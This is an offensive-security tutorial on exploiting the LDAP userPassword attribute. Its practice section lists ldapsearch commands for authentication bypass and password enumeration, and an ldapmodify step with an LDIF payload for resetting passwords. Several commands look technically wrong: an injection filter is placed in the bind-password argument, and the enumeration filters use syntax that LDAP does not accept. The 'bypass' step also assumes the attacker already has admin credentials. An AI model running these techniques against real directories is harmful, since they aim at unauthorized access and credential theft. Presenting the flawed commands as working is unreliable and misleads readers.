---
title: Exploiting LDAP userPassword for Security Bypasses
description: Learn to exploit LDAP userPassword attribute through injection and manipulation
  techniques for security bypasses.
keywords:
- LDAP exploitation
- userPassword attribute
- authentication bypass
- password hash extraction
- LDAP injection techniques
- octet string matching
- credential extraction
---

# Exploiting userPassword Attribute

## Context

This article aims to demonstrate the exploitation of the LDAP `userPassword` attribute through injection and matching techniques for authentication bypass and credential extraction. Before proceeding, readers should be familiar with the LDAP protocol fundamentals, the structure and semantics of the `userPassword` attribute, password hashing algorithms used in LDAP, and basic LDAP injection techniques.

## Theory

### Octet String Matching and LDAP Comparison Mechanisms

LDAP utilizes octet string matching as a method to compare binary or string values, which is a critical process when evaluating `userPassword` entries. The protocol employs specific matching rules, such as `octetStringOrderingMatch` (OID 2.5.13.18), to facilitate these comparisons. A key vulnerability arises from improper input sanitization, allowing crafted filters to manipulate `userPassword` comparisons.

### userPassword Attribute Exploitation Vectors

Exploiting the `userPassword` attribute typically involves injecting crafted filters to either bypass authentication checks or enumerate existing password values. Security weaknesses stem from the bitwise and octet-based comparison processes, potentially leaking information about the password content or its hash. Some LDAP servers may mishandle filter logic, creating opportunities for brute-force attacks or partial matching that attackers can exploit.

### Password Extraction and Manipulation via LDAP Injection

Attackers can leverage filter injection to extract password hashes or manipulate authentication logic. Applications often trust the results of LDAP filters for authentication without further verification, increasing the risk of exploitation. This trust assumption can be subverted, allowing attackers to manipulate passwords or gain unauthorized access.

## Practice

### Bypassing Authentication via userPassword Filter Injection

One method to bypass LDAP authentication is by injecting a filter that always evaluates to true. This technique allows an attacker to gain access without the need to know the actual password.

- **Command:**

  ```bash
  ldapsearch -x -h <target_ldap> -D "uid=target,ou=users,dc=example,dc=com" -w "*) (|(userPassword=*)) (|(userPassword=pass)" -b "dc=example,dc=com"
  ```

  This command injects a filter into the LDAP search query, effectively bypassing the password check.

- **Outcome:** The exploitation results in authentication bypass, granting access without valid credentials.

### Enumerating userPassword Values via Octet Matching

By using octet matching, an attacker can attempt to enumerate password values character by character.

- **Step 1:**

  ```bash
  ldapsearch -x -h <target_ldap> -b "dc=example,dc=com" '(&(uid=target)(userPassword={0}*))' userPassword
  ```

  This command checks if the password starts with a specified octet or character.

- **Step 2:**

  ```bash
  ldapsearch -x -h <target_ldap> -b "dc=example,dc=com" '(&(uid=target)(userPassword={0x31}*))' userPassword
  ```

  Here, the command uses bitwise enumeration to brute-force password values octet by octet.

- **Outcome:** Through these steps, attackers can extract or infer password or hash values.

### Bypassing Password Policy via Attribute Manipulation

An attacker with administrative privileges might manipulate the `userPassword` attribute to reset passwords, thereby bypassing policy restrictions.

- **Step 1:**

  ```bash
  ldapmodify -x -h <target_ldap> -D "cn=admin,dc=example,dc=com" -w <adminpass>
  ```

  This command logs the attacker in as an admin, preparing to modify the `userPassword` attribute.

- **Step 2:**

  ```plaintext
  dn: uid=target,ou=users,dc=example,dc=com
  changetype: modify
  replace: userPassword
  userPassword: newpassword
  ```

  The above payload replaces the target userâ€™s password, enabling bypass of password policies.

- **Outcome:** This manipulation can reset or set user passwords, overriding policy controls.

## Tools

- **ldapsearch**
- **ldapmodify**